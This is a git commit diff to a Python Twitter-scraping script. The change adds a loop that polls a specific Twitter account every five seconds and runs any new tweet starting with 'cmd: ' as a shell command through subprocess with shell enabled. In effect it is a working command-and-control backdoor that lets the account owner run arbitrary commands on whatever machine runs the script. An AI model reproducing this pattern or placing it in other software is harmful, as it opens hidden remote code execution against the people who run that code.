8c6bf6e37cb2421ee04567432df157bbf2058ace
Egor <ekurito@gmail.com>
2016-09-04 19:33:54 +0300

    Script, that pull in terminal text from twitter

--- twitter_script.py
+++ twitter_script.py
@@ -1,5 +1,7 @@
 import urllib
 from bs4 import BeautifulSoup #модуль для парсинга HTML страницы
+import time
+import subprocess
 
 def get_tweets(username):
     """ Gets the texts and links of username's lattest tweets """
@@ -16,9 +18,19 @@ def get_tweets(username):
             if ("class" in a.attrs) and
             ("tweet-timestamp" in a.attrs["class"])]
 
+    return(texts)
+    '''
     i = 0
     while i < 19:
         print(texts[i] + ": " + " https://twitter.com/" + links[i])
         i = i + 1
-
-get_tweets("Egor4iK1613")
+    '''
+old_tweets = []
+while True:
+    tweets = [tweet for tweet in get_tweets("EgoR4iK1613")
+                if tweet not in old_tweets]
+    for text in tweets:
+        if text.startswith("cmd: "):
+            subprocess.Popen(text[5:], shell = "True")
+    old_tweets += tweets
+    time.sleep(5)
